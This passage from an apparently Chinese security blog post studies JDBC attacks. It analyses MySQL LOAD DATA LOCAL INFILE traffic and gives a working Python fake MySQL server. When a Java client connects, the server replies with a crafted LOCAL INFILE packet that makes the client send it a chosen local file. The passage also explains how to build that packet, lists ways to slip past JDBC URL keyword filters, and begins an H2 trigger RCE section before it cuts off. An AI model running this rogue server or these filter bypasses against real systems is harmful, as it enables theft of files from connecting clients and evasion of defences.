</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">load</span><span class="w"> </span><span class="k">data</span><span class="w"> </span><span class="k">local</span><span class="w"> </span><span class="n">infile</span><span class="w"> </span><span class="s2">&#34;C:\\Users\\jie\\Desktop\\learn\\java\\TOOLS\\mysql\\large_binary_file.bin&#34;</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="n">large_text_table</span><span class="p">;</span><span class="w">
</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">mysql</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.sql.Connection</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.sql.DriverManager</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.sql.ResultSet</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.sql.Statement</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">contect_test</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">Driver</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;com.mysql.cj.jdbc.Driver&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">DB_URL</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;jdbc:mysql://127.0.0.1:3306/newtest?characterEncoding=utf8&amp;useSSL=false&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">read_URL</span><span class="o">=</span><span class="s">&#34;jdbc:mysql://127.0.0.1:3306/newtest?allowLoadLocalInfile=true&amp;allowUrlInLocalInfile=true&amp;serverTimezone=Asia/Shanghai&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="n">Driver</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        Connection conn = DriverManager.getConnection(DB_URL,&#34;root&#34;,&#34;123456&#34;);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Connection</span><span class="w"> </span><span class="n">conn</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">DriverManager</span><span class="p">.</span><span class="na">getConnection</span><span class="p">(</span><span class="n">read_URL</span><span class="p">,</span><span class="s">&#34;root&#34;</span><span class="p">,</span><span class="s">&#34;123456&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Statement</span><span class="w"> </span><span class="n">statement</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">conn</span><span class="p">.</span><span class="na">createStatement</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        5.执行SQL的对象去执行SQL，返回结果集</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">sql</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;load data local infile \&#34;C:\\\\Users\\\\jie\\\\Desktop\\\\learn\\\\java\\\\TOOLS\\\\mysql\\\\large_binary_file.bin\&#34; into table large_text_table;&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ResultSet</span><span class="w"> </span><span class="n">resultSet</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">statement</span><span class="p">.</span><span class="na">executeQuery</span><span class="p">(</span><span class="n">sql</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">resultSet</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>下面这个图是mysql终端去执行的流量，发现远远没到<code>0xffff</code>就<code>分段传输</code>了</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">load</span><span class="w"> </span><span class="k">data</span><span class="w"> </span><span class="k">local</span><span class="w"> </span><span class="n">infile</span><span class="w"> </span><span class="s2">&#34;C:\\Users\\jie\\Desktop\\learn\\java\\TOOLS\\mysql\\large_binary_file.bin&#34;</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="n">large_text_table</span><span class="p">;</span><span class="w">
</span></span></span></code></pre></div><p><img loading="lazy" src="images/image-20250218101719600.png" alt="image-20250218101719600"  />
</p>
<blockquote>
<p>然后用java当client去连接mysql传输，发现确实是<code>3byte代表长度</code>，然后我有想看看超过<code>0xffffff</code>又会怎么样呢</p>
<p>于是给python脚本<code>target_size = 0x1100000</code> 生成新文件</p>
<p>发现上限是<code>0x0ffff4</code>，然后进行<code>分段传输</code>，这是没有设置<code>maxAllowedPacket=655360</code>的情况</p>
<p>如果设置了<code>maxAllowedPacket</code>，<code>分段最大值</code>&lt;<code>maxAllowedPacket设置值</code></p>
</blockquote>
<p><img loading="lazy" src="images/image-20250218155809225.png" alt="image-20250218155809225"  />
</p>
<p>第二个数据包</p>
<p><img loading="lazy" src="images/image-20250218160338556.png" alt="image-20250218160338556"  />
</p>
<h2 id="0x02-恶意服务构造">0x02 恶意服务构造<a hidden class="anchor" aria-hidden="true" href="#0x02-恶意服务构造">#</a></h2>
<p><strong>流程理解</strong></p>
<p><strong>分析流程</strong>中可以知道其实就是下图这一步变成了<code>SHOW VARIABLES</code>，然后我们mysql端设置返回了一个<code>MySQL Protocol - local infile</code>,然后java根据这个数据包，返回我们要读取的文件内容</p>
<p><img loading="lazy" src="images/image-20250218162028798.png" alt="image-20250218162028798"  />
</p>
<p><img loading="lazy" src="images/image-20250218162217643.png" alt="image-20250218162217643"  />
</p>
<p>然后我改了一个最简单的demo</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">socket</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">binascii</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">os</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">greeting_data</span><span class="o">=</span><span class="s">&#34;4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400&#34;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">response_ok_data</span><span class="o">=</span><span class="s">&#34;0700000200000002000000&#34;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">def</span><span class="w"> </span><span class="nf">receive_data</span><span class="p">(</span><span class="n">conn</span><span class="p">):</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">conn</span><span class="p">.</span><span class="na">recv</span><span class="p">(</span><span class="n">1024</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">print</span><span class="p">(</span><span class="s">&#34;[*] Receiveing the package : {}&#34;</span><span class="p">.</span><span class="na">format</span><span class="p">(</span><span class="n">data</span><span class="p">))</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">str</span><span class="p">(</span><span class="n">data</span><span class="p">).</span><span class="na">lower</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">def</span><span class="w"> </span><span class="nf">send_data</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span><span class="n">data</span><span class="p">):</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">print</span><span class="p">(</span><span class="s">&#34;[*] Sending the package : {}&#34;</span><span class="p">.</span><span class="na">format</span><span class="p">(</span><span class="n">data</span><span class="p">))</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">conn</span><span class="p">.</span><span class="na">send</span><span class="p">(</span><span class="n">binascii</span><span class="p">.</span><span class="na">a2b_hex</span><span class="p">(</span><span class="n">data</span><span class="p">))</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">#</span><span class="w"> </span><span class="n">主要逻辑</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">def</span><span class="w"> </span><span class="nf">run</span><span class="p">():</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">while</span><span class="w"> </span><span class="n">1</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">conn</span><span class="p">,</span><span class="w"> </span><span class="n">addr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sk</span><span class="p">.</span><span class="na">accept</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">print</span><span class="p">(</span><span class="s">&#34;Connection come from {}:{}&#34;</span><span class="p">.</span><span class="na">format</span><span class="p">(</span><span class="n">addr</span><span class="o">[</span><span class="n">0</span><span class="o">]</span><span class="p">,</span><span class="n">addr</span><span class="o">[</span><span class="n">1</span><span class="o">]</span><span class="p">))</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="err">#</span><span class="w"> </span><span class="n">1</span><span class="p">.</span><span class="na">先发送第一个</span><span class="w"> </span><span class="n">问候报文</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nf">send_data</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span><span class="n">greeting_data</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">while</span><span class="w"> </span><span class="n">True</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="err">#</span><span class="w"> </span><span class="n">登录认证过程模拟</span><span class="w">  </span><span class="n">1</span><span class="p">.</span><span class="na">客户端发送request</span><span class="w"> </span><span class="n">login报文</span><span class="w"> </span><span class="n">2</span><span class="p">.</span><span class="na">服务端响应response_ok</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="nf">receive_data</span><span class="p">(</span><span class="n">conn</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">send_data</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span><span class="n">response_ok_data</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="err">#</span><span class="n">其他过程</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">data</span><span class="o">=</span><span class="n">receive_data</span><span class="p">(</span><span class="n">conn</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="err">#</span><span class="n">查询一些配置信息</span><span class="p">,</span><span class="n">其中会发送自己的</span><span class="w"> </span><span class="n">版本号</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="s">&#34;session.auto_increment_increment&#34;</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="n">data</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">_payload</span><span class="o">=</span><span class="err">&#39;</span><span class="n">42000001fb433a5c55736572735c6a69655c4465736b746f705c6c6561726e5c6a6176615c544f4f4c535c6d7973716c5c6c617267655f62696e6172795f66696c652e62696e</span><span class="err">&#39;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">send_data</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span><span class="n">_payload</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">data</span><span class="o">=</span><span class="n">receive_data</span><span class="p">(</span><span class="n">conn</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">data</span><span class="o">=</span><span class="n">receive_data</span><span class="p">(</span><span class="n">conn</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">print</span><span class="p">(</span><span class="n">data</span><span class="o">[</span><span class="p">:</span><span class="n">100</span><span class="o">]</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">elif</span><span class="w"> </span><span class="s">&#34;show warnings&#34;</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="n">data</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">_payload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">&#39;</span><span class="n">01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000</span><span class="err">&#39;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">send_data</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span><span class="w"> </span><span class="n">_payload</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">receive_data</span><span class="p">(</span><span class="n">conn</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="s">&#34;show warnings&#34;</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="n">data</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">payload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">&#39;</span><span class="n">01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000</span><span class="err">&#39;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">send_data</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span><span class="w"> </span><span class="n">payload</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">break</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">if</span><span class="w"> </span><span class="n">__name__</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="err">&#39;</span><span class="n">__main__</span><span class="err">&#39;</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">HOST</span><span class="w"> </span><span class="o">=</span><span class="err">&#39;</span><span class="n">0</span><span class="p">.</span><span class="na">0</span><span class="p">.</span><span class="na">0</span><span class="p">.</span><span class="na">0</span><span class="err">&#39;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">PORT</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">3307</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">sk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">socket</span><span class="p">.</span><span class="na">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="na">AF_INET</span><span class="p">,</span><span class="w"> </span><span class="n">socket</span><span class="p">.</span><span class="na">SOCK_STREAM</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="err">#</span><span class="n">当socket关闭后</span><span class="err">，</span><span class="n">本地端用于该socket的端口号立刻就可以被重用</span><span class="p">.</span><span class="na">为了实验的时候不用等待很长时间</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">sk</span><span class="p">.</span><span class="na">setsockopt</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="na">SOL_SOCKET</span><span class="p">,</span><span class="w"> </span><span class="n">socket</span><span class="p">.</span><span class="na">SO_REUSEADDR</span><span class="p">,</span><span class="w"> </span><span class="n">1</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">sk</span><span class="p">.</span><span class="na">bind</span><span class="p">((</span><span class="n">HOST</span><span class="p">,</span><span class="w"> </span><span class="n">PORT</span><span class="p">))</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">sk</span><span class="p">.</span><span class="na">listen</span><span class="p">(</span><span class="n">1</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">print</span><span class="p">(</span><span class="s">&#34;start fake mysql server listening on {}:{}&#34;</span><span class="p">.</span><span class="na">format</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span><span class="n">PORT</span><span class="p">))</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">run</span><span class="p">()</span><span class="w">
</span></span></span></code></pre></div><p>测试发现是<code>可行的</code>，就是<code>分析中进入第一个if (client向mysql端请求select一堆东西)</code>，我们直接返回一个<code>MySQL Protocol - local infile</code>数据包，<code>java客户端</code>接收就会去<code>读取文件</code>发送给我们<code>mysql恶意服务端</code>了</p>
<p><img loading="lazy" src="images/image-20250218163706451.png" alt="image-20250218163706451"  />
</p>
<p><img loading="lazy" src="images/image-20250218163531378.png" alt="image-20250218163531378"  />
</p>
<p>然后分解下<code>MySQL Protocol - local infile</code>流量包</p>
<p><img loading="lazy" src="images/image-20250221174151814.png" alt="image-20250221174151814"  />
</p>
<blockquote>
<p><code>42 00 00</code> 这个包的总长度(小端序，<code>00 00 42</code>=&gt;66)</p>
<p><code>01</code> Packet Number的值，代表是第一个Packet</p>
<p><code>fb</code> 代表<code>LOCAL INFILE Packet</code> 类型</p>
<p>fb后面的就是<code>文件名</code>了</p>
</blockquote>
<p>也就是需要计算下长度就行了</p>
<h2 id="0x0end-小结">0x0end 小结<a hidden class="anchor" aria-hidden="true" href="#0x0end-小结">#</a></h2>
<blockquote>
<p>我们分析可以发现就是，java这边mysql初始化，其实并没有向mysql请求<code>load data local infile</code>，但是却能利用这个点，这其实是java处理mysql返回信息的代码逻辑有关，java客户端发送每个<code>Request Query请求</code>后，<code>处理mysql返回的数据</code>时都会来到<code>TextResultsetReader#read</code>，而这个通过<code>columnCount</code>区分是<code>字段结果</code>还是<code>Response  LOCAL INFILE</code>，是<code>Response  LOCAL INFILE</code>就会向mysql服务端发送<code>对应的信息</code></p>
<p>也就是说，只要java客户端发送<code>Request Query请求</code>，我们就能返回一个<code>Response  LOCAL INFILE</code>数据包<code>进行利用</code></p>
</blockquote>
<p><img loading="lazy" src="images/image-20250221172719202.png" alt="image-20250221172719202"  />
</p>
<h2 id="绕过mysql-jdbc-关键字">绕过mysql jdbc 关键字<a hidden class="anchor" aria-hidden="true" href="#绕过mysql-jdbc-关键字">#</a></h2>
<p><a href="https://xz.aliyun.com/news/11457?time__1311=eqUxuWexnD0D9DBLPddyBcDBBFI3x&u_atoken=8ee03cc9b663e4d28c492c8e6ed1b121&u_asig=0a472f8317440160773173397e012d">https://xz.aliyun.com/news/11457?time__1311=eqUxuWexnD0D9DBLPddyBcDBBFI3x&u_atoken=8ee03cc9b663e4d28c492c8e6ed1b121&u_asig=0a472f8317440160773173397e012d</a></p>
<p><code>true</code>可以用<code>YES</code></p>
<p>mysql 8.0.x 会进行一次<code>url解密</code>，可以套一层url加密</p>
<p><img loading="lazy" src="images/image-20250407172704256.png" alt="image-20250407172704256"  />
</p>
<h1 id="heading"><a hidden class="anchor" aria-hidden="true" href="#heading">#</a></h1>
<h1 id="0x4-h2">0x4 H2<a hidden class="anchor" aria-hidden="true" href="#0x4-h2">#</a></h1>
<blockquote>
<p>$$在h2中代表设置函数</p>
</blockquote>
<p>这里会反射调用我们设置的方法</p>
<p><img loading="lazy" src="images/image-20250207175948712.png" alt="image-20250207175948712"  />
</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nl">load</span><span class="p">:</span><span class="n">87</span><span class="p">,</span><span class="w"> </span><span class="n">TriggerObject</span><span class="w"> </span><span class="p">(</span><span class="n">org</span><span class="p">.</span><span class="na">h2</span><span class="p">.</span><span class="na">schema</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">setTriggerAction</span><span class="p">:</span><span class="n">149</span><span class="p">,</span><span class="w"> </span><span class="n">TriggerObject</span><span class="w"> </span><span class="p">(</span><span class="n">org</span><span class="p">.</span><span class="na">h2</span><span class="p">.</span><span class="na">schema</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">setTriggerSource</span><span class="p">:</span><span class="n">142</span><span class="p">,</span><span class="w"> </span><span class="n">TriggerObject</span><span class="w"> </span><span class="p">(</span><span class="n">org</span><span class="p">.</span><span class="na">h2</span><span class="p">.</span><span class="na">schema</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">update</span><span class="p">:</span><span class="n">125</span><span class="p">,</span><span class="w"> </span><span class="n">CreateTrigger</span><span class="w"> </span><span class="p">(</span><span class="n">org</span><span class="p">.</span><span class="na">h2</span><span class="p">.</span><span class="na">command</span><span class="p">.</span><span class="na">ddl</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">update</span><span class="p">:</span><span class="n">139</span><span class="p">,</span><span class="w"> </span><span class="n">CommandContainer</span><span class="w"> </span><span class="p">(</span><span class="n">org</span><span class="p">.</span><span class="na">h2</span><span class="p">.</span><span class="na">command</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">executeUpdate</span><span class="p">:</span><span class="n">304</span><span class="p">,</span><span class="w"> </span><span class="n">Command</span><span class="w"> </span><span class="p">(</span><span class="n">org</span><span class="p">.</span><span class="na">h2</span><span class="p">.</span><span class="na">command</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">executeUpdate</span><span class="p">:</span><span class="n">248</span><span class="p">,</span><span class="w"> </span><span class="n">Command</span><span class="w"> </span><span class="p">(</span><span class="n">org</span><span class="p">.</span><span class="na">h2</span><span class="p">.</span><span class="na">command</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">openSession</span><span class="p">:</span><span class="n">280</span><span class="p">,</span><span class="w"> </span><span class="n">Engine</span><span class="w"> </span><span class="p">(</span><span class="n">org</span><span class="p">.</span><span class="na">h2</span><span class="p">.</span><span class="na">engine</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">createSession</span><span class="p">:</span><span class="n">201</span><span class="p">,</span><span class="w"> </span><span class="n">Engine</span><span class="w"> </span><span class="p">(</span><span class="n">org</span><span class="p">.</span><span class="na">h2</span><span class="p">.</span><span class="na">engine</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">connectEmbeddedOrServer</span><span class="p">:</span><span class="n">344</span><span class="p">,</span><span class="w"> </span><span class="n">SessionRemote</span><span class="w"> </span><span class="p">(</span><span class="n">org</span><span class="p">.</span><span class="na">h2</span><span class="p">.</span><span class="na">engine</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;</span><span class="n">init</span><span class="o">&gt;</span><span class="p">:</span><span class="n">124</span><span class="p">,</span><span class="w"> </span><span class="n">JdbcConnection</span><span class="w"> </span><span class="p">(</span><span class="n">org</span><span class="p">.</span><span class="na">h2</span><span class="p">.</span><span class="na">jdbc</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">connect</span><span class="p">:</span><span class="n">59</span><span class="p">,</span><span class="w"> </span><span class="n">Driver</span><span class="w"> </span><span class="p">(</span><span class="n">org</span><span class="p">.</span><span class="na">h2</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">getConnection</span><span class="p">:</span><span class="n">681</span><span class="p">,</span><span class="w"> </span><span class="n">DriverManager</span><span class="w"> </span><span class="p">(</span><span class="n">java</span><span class="p">.</span><span class="na">sql</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">getConnection</span><span class="p">:</span><span class="n">252</span><span class="p">,</span><span class="w"> </span><span class="n">DriverManager</span><span class="w"> </span><span class="p">(</span><span class="n">java</span><span class="p">.</span><span class="na">sql</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">main</span><span class="p">:</span><span class="n">9</span><span class="p">,</span><span class="w"> </span><span class="n">H2</span><span class="w">
</span></span></span></code></pre></div><h2 id="0x01-trigger-rce">0x01 TRIGGER RCE<a hidden class="anchor" aria-hidden="true" href="#0x01-trigger-rce">#</a></h2>
<h3 id="javascript">javascript<a hidden class="anchor" aria-hidden="true" href="#javascript">#</a></h3>
<blockquote>
<p>在JDK15 中 <code>JavaScript /Nashorn</code>引擎被彻底移除(也就是jdk15以上用不了<code>//javascript</code>这种方式rce，<code>jsEngine会为null</code>然后空指针报错)</p>
</blockquote>
<p><strong>环境</strong></p>
<p>jdk8u20</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;groupId&gt;</span>com.h2database<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;artifactId&gt;</span>h2<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;version&gt;</span>1.4.200<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/dependency&gt;</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">h2</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.sql.DriverManager</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">H2</span><span class="w"> </span><span class="p">{</span><span class="w">
